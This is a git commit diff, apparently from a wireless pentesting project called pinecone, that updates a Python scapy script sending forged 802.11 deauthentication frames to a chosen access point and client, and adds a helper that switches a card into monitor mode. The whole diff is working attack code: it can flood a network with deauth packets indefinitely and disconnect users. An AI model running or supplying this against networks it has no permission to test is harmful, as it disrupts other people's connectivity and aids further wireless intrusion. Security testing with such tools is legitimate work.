b59bf27e5d3467d2dfe048e43af796f61f330f25
Valentín Blanco <valentin_gomez1@hotmail.com>
2018-07-10 10:49:32 +0200

    Updated deauth attack.

--- deauth.py
+++ deauth.py
@@ -2,16 +2,29 @@
 
 from argparse import ArgumentParser
 
+from pyric import pyw
 from scapy.layers.dot11 import *
+
+from pinecone.core.utils import IfaceUtils
 
 if __name__ == "__main__":
     args_parser = ArgumentParser()
-
-    # TODO: probably the channel argument is needed.
-    args_parser.add_argument("-i", "--iface", help="monitor mode interface", default="wlan0")
-    args_parser.add_argument("-b", "--bssid", required=True)
+    args_parser.add_argument("-i", "--iface", help="interface", default="wlan0", type=str)
+    args_parser.add_argument("-b", "--bssid", required=True, type=str)
+    args_parser.add_argument("-c", "--channel", required=True, type=int)
+    args_parser.add_argument("--client", default="FF:FF:FF:FF:FF:FF", type=str)
+    args_parser.add_argument("-n", "--num-packets", default=10, type=int)
 
     args = args_parser.parse_args()
 
-    sendp(RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=args.bssid, addr3=args.bssid)/Dot11Deauth(),
-          iface=args.iface)
+    interface = IfaceUtils.set_monitor_mode(args.iface)
+    pyw.chset(interface, args.channel)
+
+    i = args.num_packets if args.num_packets > 0 else -1
+
+    while i != 0:
+        sendp(RadioTap()/Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)/Dot11Deauth(),
+              iface=args.iface)
+
+        if i != -1:
+            i -= 1
---
+++ pinecone/core/utils.py
@@ -0,0 +1,19 @@
+import typing
+
+from pyric import pyw
+
+
+class IfaceUtils:
+    @staticmethod
+    def _get_card(interface: typing.Union[str, pyw.Card]) -> pyw.Card:
+        return pyw.getcard(interface) if isinstance(interface, str) else interface
+
+    @staticmethod
+    def set_monitor_mode(interface: typing.Union[str, pyw.Card]) -> pyw.Card:
+        interface = IfaceUtils._get_card(interface)
+
+        pyw.down(interface)
+        pyw.modeset(interface, "monitor")
+        pyw.up(interface)
+
+        return interface
